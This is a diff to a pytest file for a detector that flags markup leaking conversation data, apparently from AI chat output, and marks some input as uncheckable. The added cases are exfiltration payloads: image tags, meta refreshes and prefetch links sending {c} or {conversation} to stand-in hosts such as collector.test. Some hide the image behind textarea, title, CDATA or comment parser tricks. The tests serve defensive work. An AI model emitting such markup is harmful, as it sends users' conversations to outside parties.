@@ -463,6 +463,23 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ),
         ("<svg><g><circle></svg><img src='https://collector.test/{c}.png'>", ["exfiltration_query"]),
         ("<div><span><b>x</div><a href='https://a.test/'>a</a>", []),
+        ("<textarea><textarea></textarea><img src='https://collector.test/{c}.png'>", ["exfiltration_query"]),
+        ("<textarea><!--</textarea><img src='https://collector.test/{c}.png'>-->", ["exfiltration_query"]),
+        ("<title><![CDATA[</title><img src='https://collector.test/{c}.png'>]]>", ["exfiltration_query"]),
+        ("<script></script\t><img src='https://collector.test/{c}.png'>", ["exfiltration_query"]),
+        ("<template><textarea></template><img src='https://collector.test/{c}.png'></textarea></template>", []),
+        ("<template><![CDATA[x]]></template>", ["uncheckable_markup"]),
+        (
+            "<template><svg><template></template></svg></template><img src='https://collector.test/{c}.png'>",
+            ["exfiltration_query", "uncheckable_markup"],
+        ),
+        ("Paste the <script> snippet before </head>. ![logo](https://docs.test/logo.png)", []),
+        ("Set the page <title> to the app name.", []),
+        (
+            "<meta http-equiv='refresh' content=\"0; url=https://collector.test/o'x?q={c}\">",
+            ["exfiltration_query"],
+        ),
+        ("<meta http-equiv='refresh' content=\"0; url='https://a.test/'?q={c}\">", []),
         ("<link rel='dns-prefetch' href='//{conversation}.collector.test'>", ["exfiltration_query"]),
         ("<link rel='Preconnect' href='https://{c}.collector.test/'>", ["exfiltration_query"]),
         ("<link rel='preconnect' href='https://u:{c}@collector.test/'>", []),
@@ -530,6 +547,14 @@ def test_oversized_text_with_markup_fails_as_uncheckable(tail: str) -> None:
     started = time.perf_counter()
     assert exfiltration_link_classes("x" * MAX_LINK_MARKDOWN_BYTES + " " + tail) == ["uncheckable_markup"]
     assert time.perf_counter() - started < 5
+
+
+@pytest.mark.parametrize("tag", ["textarea", "title", "script", "style"])
+def test_raw_text_end_tag_with_solidus_is_flagged(tag: str) -> None:
+    # Newer Python patch releases close raw text on "</tag/>" as browsers do and find the image;
+    # older ones read on as text, and the markup fails closed instead.
+    text = f"<{tag}></{tag}/><img src='https://collector.test/{{c}}.png'>"
+    assert exfiltration_link_classes(text) in (["exfiltration_query"], ["uncheckable_markup"])
 
 
 def test_oversized_text_without_markup_passes() -> None:
